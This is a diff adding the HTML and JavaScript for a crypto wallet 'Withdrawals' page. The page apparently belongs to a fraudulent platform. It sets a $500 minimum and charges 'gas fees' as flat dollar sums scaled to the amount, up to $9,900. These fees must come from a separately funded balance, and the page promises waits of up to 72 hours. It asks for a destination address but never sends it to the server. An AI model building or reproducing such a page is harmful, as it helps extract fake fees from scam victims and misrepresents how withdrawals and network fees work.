@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Withdrawals</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #0b0f15;
+      --panel: #0e1420;
+      --panel-2: #0b101b;
+      --card: #121826;
+      --border: rgba(255,255,255,0.12);
+      --line: rgba(255,255,255,0.08);
+      --text: #e6e9ef;
+      --muted: #93a0b3;
+      --success: #25c05a;
+      --primary: #6d5efc;
+      --primary-2: #5a7bff;
+      --shadow: rgba(0,0,0,0.55);
+    }
+
+    * { box-sizing: border-box; }
+    html, body { height: 100%; }
+
+    body {
+      margin: 0;
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, 'Helvetica Neue', Arial;
+      color: var(--text);
+      background: radial-gradient(120% 120% at 0% 0%, rgba(109,94,252,0.12) 0%, rgba(109,94,252,0) 40%),
+                  linear-gradient(180deg, #0a0f17, #06090f 70%);
+    }
+
+    .top {
+      height: 56px; display: flex; align-items: center; gap: 10px; padding: 0 12px; color: var(--muted);
+      border-bottom: 1px solid var(--line);
+      background: rgba(10,14,22,.6); backdrop-filter: blur(6px);
+      position: sticky; top: 0; z-index: 5;
+    }
+    .back { width: 32px; height: 32px; border-radius: 8px; border: 1px solid var(--line); display: grid; place-items: center; cursor: pointer; color: var(--muted); background: transparent; }
+
+    .frame { min-height: calc(100% - 56px); padding: 28px 18px 56px; display: flex; justify-content: center; }
+    .container { width: 960px; max-width: 96vw; }
+
+    .panel { background: #ffffff; color: #0b0f15; border-radius: 12px; padding: 18px; width: 640px; max-width: 100%; margin: 0 auto; }
+
+    .label { font-weight: 700; margin: 12px 0 6px; }
+
+    .input, .select {
+      width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid #d8dde6; outline: none; font-family: inherit;
+      background: #f6f7fb; color: #0b0f15;
+    }
+
+    .row { display: grid; grid-template-columns: minmax(0,1fr) auto minmax(0, 360px); gap: 12px; align-items: center; }
+    .mini { display: flex; align-items: center; gap: 8px; padding: 10px 12px; background: #f6f7fb; border: 1px solid #d8dde6; border-radius: 8px; }
+    .chip { width: 28px; height: 28px; border-radius: 999px; display: grid; place-items: center; font-weight: 800; }
+    .chip.in { background: #fde68a; }
+    .chip.ex { background: #e9d5ff; }
+    .row .mini:last-child { max-width: 360px; overflow: hidden; }
+    .row .mini:last-child > div { min-width: 0; }
+
+    .inline { display: grid; grid-template-columns: 1fr auto; gap: 10px; }
+    .btn-ghost { padding: 8px 12px; border: 1px solid #d8dde6; background: #eef1f6; border-radius: 8px; cursor: pointer; font-weight: 600; }
+
+    .note { margin-top: 8px; font-size: 12px; color: #6b7280; }
+    .error { color: #ef4444; font-size: 12px; margin-top: 4px; }
+
+    /* Keep external container stable while typing long addresses */
+    #externalAddr { display: block; max-width: 100%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+    .cta {
+      margin-top: 14px; width: 100%; padding: 12px 14px; border-radius: 10px; border: none; cursor: pointer; color: white;
+      background: linear-gradient(90deg, #1f2937, #111827); display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+      font-weight: 700;
+    }
+
+    .section { margin-top: 26px; }
+    .title { font-size: 26px; font-weight: 800; }
+
+    a.link { color: inherit; text-decoration: none; }
+  </style>
+</head>
+<body>
+  <div class="top">
+    <button class="back" onclick="history.back()" aria-label="Back">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </button>
+    <div style="font-weight:800;">Withdrawals</div>
+  </div>
+
+  <div class="frame">
+    <div class="container">
+
+      <div class="panel">
+        <div class="label">Which crypto asset would you like to withdraw?</div>
+        <select class="select" aria-label="Asset">
+          <option>BTC</option>
+          <option>ETH</option>
+          <option>BNB</option>
+          <option>USDT</option>
+        </select>
+
+        <div class="label">Enter Crypto Address</div>
+        <input id="destAddress" class="input" placeholder="Enter destination address" aria-label="Destination address" />
+        <div id="addressError" class="error" style="display:none;">Please enter a destination address.</div>
+
+        <div class="label">Route</div>
+        <div class="row">
+          <div class="mini"><div class="chip in">IN</div> <div><div style="font-weight:700;">From Internal</div><div id="internalName" style="font-size:12px; opacity:.7;">Wallet</div></div></div>
+          <div style="opacity:.6;">➜</div>
+          <div class="mini"><div class="chip ex">EX</div> <div><div style="font-weight:700;">To External</div><div id="externalAddr" style="font-size:12px; opacity:.7;">…</div></div></div>
+        </div>
+
+        <div class="label">Enter Amount</div>
+        <div class="inline">
+          <input id="amountInput" class="input" value="" aria-label="Amount" />
+          <button class="btn-ghost" type="button" onclick="fillMax()">Max</button>
+        </div>
+        <div id="balanceNote" class="note">(Balance: $0.00) - $</div>
+        <div id="minAmountNote" class="note" style="color: #ef4444; font-weight: 600;">Minimum withdrawal amount: $500</div>
+
+        <div class="label">Gas Fees</div>
+        <select id="gasSelect" class="select" aria-label="Gas fee tier">
+          <option value="">Select amount first</option>
+        </select>
+        <div id="gasBalanceNote" class="note">(Balance: $0.00)</div>
+        <div id="gasError" class="error" style="display:none;">Insufficient gas fee.</div>
+
+        <div class="mini" style="margin-top:10px; background:#eef2ff; border-color:#c7d2fe;">
+          <div style="font-weight:700; color:#1f2937;">Fee tier details</div>
+          <div id="estimateText" style="font-size:12px; color:#374151;">Estimated time: 1 minute</div>
+        </div>
+
+        <button id="withdrawBtn" class="cta" type="button">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 5v14m0 0l-4-4m4 4l4-4" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          Withdraw
+        </button>
+      </div>
+
+      <div style="margin-top:18px;"><a class="link" href="home.html">← Back to Home</a></div>
+    </div>
+  </div>
+
+  <script>
+    // Add number-only validation to amount input
+    document.addEventListener('DOMContentLoaded', function() {
+      const amountInput = document.getElementById('amountInput');
+      if (amountInput) {
+        amountInput.addEventListener('input', function(e) {
+          // Remove any non-numeric characters except decimal point
+          e.target.value = e.target.value.replace(/[^0-9.]/g, '');
+          // Ensure only one decimal point
+          const parts = e.target.value.split('.');
+          if (parts.length > 2) {
+            e.target.value = parts[0] + '.' + parts.slice(1).join('');
+          }
+        });
+        
+        amountInput.addEventListener('keypress', function(e) {
+          // Allow: backspace, delete, tab, escape, enter, decimal point
+          if ([8, 9, 27, 13, 46].indexOf(e.keyCode) !== -1 ||
+              // Allow: Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X
+              (e.keyCode === 65 && e.ctrlKey === true) ||
+              (e.keyCode === 67 && e.ctrlKey === true) ||
+              (e.keyCode === 86 && e.ctrlKey === true) ||
+              (e.keyCode === 88 && e.ctrlKey === true) ||
+              // Allow: home, end, left, right
+              (e.keyCode >= 35 && e.keyCode <= 39)) {
+            return;
+          }
+          // Ensure that it is a number and stop the keypress
+          if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105) && e.keyCode !== 190) {
+            e.preventDefault();
+          }
+        });
+        
+        // Update gas fees when amount changes
+        amountInput.addEventListener('input', function(e) {
+          const amount = parseFloat(e.target.value) || 0;
+          updateGasFees(amount);
+        });
+      }
+    });
+
+    // Dynamic gas fee calculation based on amount
+    function updateGasFees(amount) {
+      const gasSelect = document.getElementById('gasSelect');
+      if (!gasSelect) return;
+      
+      // Clear existing options
+      gasSelect.innerHTML = '';
+      
+      if (!amount || amount <= 0) {
+        gasSelect.innerHTML = '<option value="">Select amount first</option>';
+        const est = document.getElementById('estimateText');
+        if (est) est.textContent = 'Estimated time: —';
+        return;
+      }
+      
+      let gasFees = [];
+      let tierName = '';
+      
+      // Determine gas fee tier based on amount
+      if (amount >= 0 && amount <= 1000) {
+        gasFees = [50, 100, 250];
+        tierName = '0-1000';
+      } else if (amount > 1000 && amount <= 5000) {
+        gasFees = [200, 300, 550];
+        tierName = '1000-5000';
+      } else if (amount > 5000 && amount <= 10000) {
+        gasFees = [500, 600, 850];
+        tierName = '5000-10000';
+      } else if (amount > 10000 && amount <= 15000) {
+        gasFees = [800, 900, 1050];
+        tierName = '10000-15000';
+      } else if (amount > 15000 && amount <= 20000) {
+        gasFees = [1000, 1200, 1550];
+        tierName = '15000-20000';
+      } else if (amount > 20000 && amount <= 25000) {
+        gasFees = [1500, 1700, 1950];
+        tierName = '20000-25000';
+      } else if (amount > 25000 && amount <= 30000) {
+        gasFees = [1900, 2000, 2200];
+        tierName = '25000-30000';
+      } else if (amount > 30000 && amount <= 50000) {
+        gasFees = [3000, 4000, 5000];
+        tierName = '30000-50000';
+      } else if (amount > 50000 && amount <= 70000) {
+        gasFees = [5050, 6000, 7000];
+        tierName = '50000-70000';
+      } else if (amount > 70000 && amount <= 100000) {
+        gasFees = [7000, 8000, 9000];
+        tierName = '70000-100000';
+      } else if (amount > 100000) {
+        gasFees = [9050, 9550, 9900];
+        tierName = '100000+';
+      }
+      
+      // Add options to select
+      const speedLabels = ['Economy', 'Standard', 'Fast'];
+      gasFees.forEach((fee, index) => {
+        const option = document.createElement('option');
+        option.value = fee;
+        option.textContent = `${speedLabels[index]} - $${fee.toLocaleString()}`;
+        gasSelect.appendChild(option);
+      });
+
+      // Refresh estimate based on the currently selected label
+      if (typeof updateEstimate === 'function') {
+        updateEstimate();
+      }
+    }
+
+    function fillMax(){
+      const input = document.getElementById('amountInput');
+      const max = window.__walletUsdBalance || 0;
+      if (input) {
+        input.value = String(max.toFixed(2));
+        updateGasFees(max);
+      }
+    }
+    // Dynamic route fields and balance
+    (async function initSend(){
+      // internal name
+      const name = localStorage.getItem('we_wallet_name') || 'Wallet';
+      document.getElementById('internalName').textContent = name;
+      // external address reflects input
+      const dest = document.getElementById('destAddress');
+      const external = document.getElementById('externalAddr');
+      function sync(){ external.textContent = dest.value ? dest.value : '…'; }
+      dest.addEventListener('input', sync); sync();
+      // backend balances (from SQLite)
+      try {
+        const uid = localStorage.getItem('we_uid');
+        if (uid) {
+          const r = await fetch(`/api/profile/${encodeURIComponent(uid)}`);
+          if (r.ok) {
+            const j = await r.json();
+            const gasUsd = Number(j.balance_usd || 0);
+            const homeUsd = Number(j.wallet_balance_usd || 0);
+            window.__usdBalance = gasUsd;
+            window.__walletUsdBalance = homeUsd;
+            const balNote = document.getElementById('balanceNote');
+            if (balNote) balNote.textContent = `(Balance: $${homeUsd.toLocaleString(undefined,{maximumFractionDigits:2})}) - $`;
+            const gasBal = document.getElementById('gasBalanceNote');
+            if (gasBal) gasBal.textContent = `(Balance: $${gasUsd.toLocaleString(undefined,{maximumFractionDigits:2})})`;
+          }
+        }
+      } catch {}
+
+      // wallet spendable balance from BscScan (BNB -> USD)
+      try {
+        const addr = localStorage.getItem('we_bsc_address');
+        if (addr) {
+          const key = localStorage.getItem('we_bscscan_key') || '';
+          const bres = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${addr}&tag=latest${key?`&apikey=${key}`:''}`);
+          const bj = await bres.json();
+          if (bj.status === '1') {
+            const wei = BigInt(bj.result || '0');
+            const bnb = Number(wei) / 1e18;
+            const pres = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
+            const pj = await pres.json();
+            const price = pj?.binancecoin?.usd || 0;
+            const usd = bnb * price;
+            if (!Number.isFinite(window.__walletUsdBalance) || window.__walletUsdBalance <= 0) {
+              window.__walletUsdBalance = usd;
+              const balNote = document.getElementById('balanceNote');
+              if (balNote) balNote.textContent = `(Balance: $${usd.toLocaleString(undefined,{maximumFractionDigits:2})}) - $`;
+            }
+          }
+        }
+      } catch {}
+    })();
+
+    // Gas fee interactions
+    (function gasFee(){
+      const select = document.getElementById('gasSelect');
+      const estimate = document.getElementById('estimateText');
+      const errorEl = document.getElementById('gasError');
+      function updateEstimate(){
+        const opt = select.options[select.selectedIndex];
+        const label = (opt && opt.textContent ? opt.textContent : '').toLowerCase();
+        if (label.includes('economy')) estimate.textContent = 'Estimated time: 72 hours';
+        else if (label.includes('standard')) estimate.textContent = 'Estimated time: 24 hours';
+        else if (label.includes('fast')) estimate.textContent = 'Estimated time: 3 hours';
+        else estimate.textContent = 'Estimated time: —';
+      }
+      updateEstimate();
+      select.addEventListener('change', updateEstimate);
+
+      document.getElementById('withdrawBtn').addEventListener('click', async () => {
+        const balance = Number(window.__usdBalance || 0); // gas balance
+        const required = Number(select.value) || 0;
+        const uid = localStorage.getItem('we_uid');
+        const amtInput = document.getElementById('amountInput');
+        const destInput = document.getElementById('destAddress');
+        const addressError = document.getElementById('addressError');
+        const amount = Number((amtInput?.value || '').trim());
+        const dest = (destInput?.value || '').trim();
+        if (!uid || !Number.isFinite(amount) || amount <= 0) {
+          errorEl.style.display = 'block';
+          errorEl.textContent = 'Enter a valid amount and ensure you are authenticated.';
+          return;
+        }
+        if (amount < 500) {
+          errorEl.style.display = 'block';
+          errorEl.textContent = 'Minimum withdrawal amount is $500.';
+          return;
+        }
+        if (!dest) {
+          addressError.style.display = 'block';
+          return;
+        }
+        addressError.style.display = 'none';
+        if (balance < required) {
+          errorEl.style.display = 'block';
+          errorEl.textContent = `Insufficient gas fee. Required: $${required.toLocaleString()} | Balance: $${balance.toLocaleString(undefined,{maximumFractionDigits:2})}`;
+          return;
+        }
+        try {
+          errorEl.style.display = 'none';
+          const r = await fetch('/api/withdraw', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ uid, amountUsd: amount, gasUsd: required })
+          });
+          const j = await r.json();
+          if (!r.ok || !j.ok) {
+            errorEl.style.display = 'block';
+            errorEl.textContent = 'Failed: ' + (j.error || r.statusText);
+            return;
+          }
+          // Update displayed balances
+          const gasBal = document.getElementById('gasBalanceNote');
+          if (gasBal) gasBal.textContent = `(Balance: $${Number(j.profile?.balance_usd || 0).toLocaleString(undefined,{maximumFractionDigits:2})})`;
+          const balNote = document.getElementById('balanceNote');
+          if (balNote) balNote.textContent = `(Balance: $${Number(j.profile?.wallet_balance_usd || 0).toLocaleString(undefined,{maximumFractionDigits:2})}) - $`;
+          alert('Withdrawal submitted.');
+        } catch (e) {
+          errorEl.style.display = 'block';
+          errorEl.textContent = 'Network error.';
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
